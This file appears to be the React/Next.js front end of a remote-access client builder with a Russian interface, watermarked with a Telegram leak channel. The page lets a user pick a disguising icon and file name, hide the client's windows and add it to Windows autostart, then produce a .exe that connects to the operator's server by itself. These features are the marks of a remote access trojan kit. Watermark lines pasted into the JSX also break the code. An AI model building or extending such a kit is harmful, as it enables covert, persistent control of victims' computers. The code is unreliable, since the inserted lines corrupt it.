// t.me/SentinelLinks

"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Download, FileCode, Upload, PlayCircle, EyeOff, Loader2, Info } from "lucide-react"
import { toast } from "sonner"
import Image from "next/image"

export function BuilderPage() {
  const [config, setConfig] = useState({
    fileName: "grob-client",
    iconFile: null as File | null,
    iconPreview: null as string | null,
    hideDesktopIcon: false,
    autoStartup: false,
  })
  const [isBuilding, setIsBuilding] = useState(false)
  const [userUid, setUserUid] = useState<string>("")

  useEffect(() => {
    const userStr = sessionStorage.getItem("user")
    if (userStr) {
      try {
        const user = JSON.parse(userStr)
        setUserUid(user.uid || "")
      } catch (e) {
        console.error("Failed to parse user:", e)
      }
    }
  }, [])

  const handleIconUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (file) {
      if (!file.type.match(/image\/(png|jpeg|jpg|x-icon)/)) {
        toast.error("Неподдерживаемый формат", {
          description: "Загрузите PNG, JPG или ICO файл",
        })
        return
      }

      const reader = new FileReader()
      reader.onload = (event) => {
        setConfig({
          ...config,
          iconFile: file,
          iconPreview: event.target?.result as string,
        })
        toast.success("Иконка загружена", {
          description: file.name,
        })
      }
      reader.readAsDataURL(file)
    }
  }

  const handleDownload = async () => {
    try {
      setIsBuilding(true)

      if (!userUid) {
        toast.error("UID не найден", {
          description: "Перезайдите в аккаунт",
        })
        setIsBuilding(false)
        return
      }

      toast.info("Сборка клиента...", {
        description: "Это может занять несколько секунд",
      })

      const formData = new FormData()
      formData.append("fileName", config.fileName)
      formData.append("hideDesktopIcon", String(config.hideDesktopIcon))
      formData.append("autoStartup", String(config.autoStartup))
      formData.append("userUid", userUid)
      if (config.iconFile) {
        formData.append("iconFile", config.iconFile)
      }

      const response = await fetch("/api/builder", {
        method: "POST",
        body: formData,
      })

      if (!response.ok) {
        const error = await response.json()
        throw new Error(error.error || error.details || "Ошибка сборки клиента")
      }

      const blob = await response.blob()
      const url = window.URL.createObjectURL(blob)
      const a = document.createElement("a")
      a.href = url
      a.download = `${config.fileName}.exe`
      document.body.appendChild(a)
      a.click()
      window.URL.revokeObjectURL(url)
      document.body.removeChild(a)

      toast.success("Клиент готов!", {
        description: `${config.fileName}.exe успешно собран`,
      })
    } catch (error) {
      console.error("Ошибка сборки:", error)
      toast.error("Ошибка сборки клиента", {
        description: error instanceof Error ? error.message : "Попробуйте снова",
      })
    } finally {
      setIsBuilding(false)
    }
  }

  return (
    <div className="flex-1 bg-background p-6 overflow-auto">
      <div className="max-w-3xl mx-auto space-y-6">
        <div className="space-y-2">
          <h1 className="text-4xl font-bold tracking-tight">Билдер клиента</h1>
          <p className="text-lg text-muted-foreground">Создайте клиент для удаленного доступа</p>
        </div>

        <Card className="p-4 bg-blue-500/10 border-blue-500/20">
          <div className="flex items-start gap-3">
            <Info className="w-5 h-5 text-blue-500 mt-0.5 flex-shrink-0" />
            <div>
              <p className="text-sm font-medium text-blue-500">Автоматическое подключение</p>
              <p className="text-xs text-muted-foreground mt-1">
                Клиент автоматически подключается к серверу. IP адрес и порт настроены на сервере.
              </p>
            </div>
          </div>
        </Card>

        {userUid && (
          <Card className="p-4 bg-primary/5 border-primary/20">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center">
                <FileCode className="w-5 h-5 text-primary" />
              </div>
              <div>
                <p className="text-sm font-medium">Ваш UID</p>
                <p className="text-xs text-muted-foreground font-mono">{userUid}</p>
              </div>
            </div>
          </Card>
        )}

        <Card className="p-6 space-y-6">
          <div className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="fileName" className="text-base font-medium flex items-center gap-2">
                <FileCode className="w-4 h-4" />
                Имя файла
              </Label>
              <Input
                id="fileName"
                placeholder="grob-client"
                value={config.fileName}
                onChange={(e) => setConfig({ ...config, fileName: e.target.value })}
                className="h-11"
              />
              <p className="text-xs text-muted-foreground">
                Файл будет сохранен как {config.fileName || "grob-client"}.exe
              </p>
            </div>

            <div className="border-t border-border" />

            <div className="space-y-3">
              <Label className="text-base font-medium flex items-center gap-2">
                <Upload className="w-4 h-4" />
                Иконка приложения
              </Label>

              <div className="flex items-start gap-4">
                <label className="flex-1 cursor-pointer group">
                  <div className="border-2 border-dashed border-border rounded-lg p-6 hover:border-primary/50 hover:bg-secondary/30 transition-all">
                    <div className="flex flex-col items-center gap-2 text-center">
                      {config.iconPreview ? (
                        <>
                          <div className="w-16 h-16 rounded-lg border border-border bg-secondary/50 flex items-center justify-center">
                            <Image
                              src={config.iconPreview || "/placeholder.svg"}
                              alt="Icon preview"
                              width={48}
                              height={48}
                              className="w-12 h-12 object-contain"
                            />
                          </div>
                          <div className="space-y-0.5">
                            <p className="text-sm font-medium">{config.iconFile?.name}</p>
                            <p className="text-xs text-muted-foreground">Нажмите для замены</p>
                          </div>
                        </>
                      ) : (
                        <>
                          <div className="w-12 h-12 rounded-full bg-secondary flex items-center justify-center group-hover:bg-secondary/80 transition-colors">
                            <Upload className="w-6 h-6 text-muted-foreground" />
                          </div>
                          <div className="space-y-0.5">
                            <p className="text-sm font-medium">Загрузить иконку</p>
                            <p className="text-xs text-muted-foreground">PNG, JPG или ICO до 5MB</p>
                          </div>
                        </>
                      )}
                    </div>
                    <input
                      type="file"
                      accept="image/png,image/jpeg,image/jpg,.ico"
                      onChange={handleIconUpload}
                      className="hidden"
                    />
                  </div>
                </label>
              </div>
            </div>

// t.me/SentinelLinks
            <div className="border-t border-border" />

            <div className="space-y-3">
              <Label className="text-base font-medium">Дополнительные опции</Label>

// t.me/SentinelLinks
              <div className="space-y-3">
                <label className="flex items-start gap-3 p-3 rounded-lg border border-border hover:bg-secondary/30 cursor-pointer transition-colors group">
                  <input
                    type="checkbox"
                    checked={config.hideDesktopIcon}
                    onChange={(e) => setConfig({ ...config, hideDesktopIcon: e.target.checked })}
                    className="w-5 h-5 mt-0.5 rounded border-border"
                  />
                  <div className="flex-1 space-y-1">
                    <div className="flex items-center gap-2">
                      <EyeOff className="w-4 h-4 text-muted-foreground" />
                      <span className="font-medium">Скрытый режим</span>
                    </div>
                    <p className="text-sm text-muted-foreground">Клиент работает в фоновом режиме без видимых окон</p>
                  </div>
                </label>

                <label className="flex items-start gap-3 p-3 rounded-lg border border-border hover:bg-secondary/30 cursor-pointer transition-colors group">
                  <input
                    type="checkbox"
                    checked={config.autoStartup}
                    onChange={(e) => setConfig({ ...config, autoStartup: e.target.checked })}
                    className="w-5 h-5 mt-0.5 rounded border-border"
                  />
                  <div className="flex-1 space-y-1">
                    <div className="flex items-center gap-2">
                      <PlayCircle className="w-4 h-4 text-muted-foreground" />
                      <span className="font-medium">Автозапуск при старте Windows</span>
                    </div>
                    <p className="text-sm text-muted-foreground">Добавляет программу в автозагрузку системы</p>
                  </div>
                </label>
              </div>
            </div>
          </div>
        </Card>

        <Button
          onClick={handleDownload}
          disabled={isBuilding || !config.fileName.trim() || !userUid}
          className="w-full h-12 text-base font-semibold"
          size="lg"
        >
          {isBuilding ? (
            <>
              <Loader2 className="w-5 h-5 mr-2 animate-spin" />
              Сборка...
            </>
          ) : (
            <>
              <Download className="w-5 h-5 mr-2" />
              Собрать и скачать клиент
            </>
          )}
        </Button>

        {isBuilding && (
          <Card className="border-amber-500/20 bg-amber-500/5">
            <div className="p-4 space-y-2">
              <div className="flex items-center gap-2">
                <Loader2 className="w-4 h-4 animate-spin text-amber-500" />
                <p className="text-sm font-medium">Сборка в процессе...</p>
              </div>
              <p className="text-sm text-muted-foreground">Это займет несколько секунд</p>
            </div>
          </Card>
        )}
      </div>
    </div>
  )
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
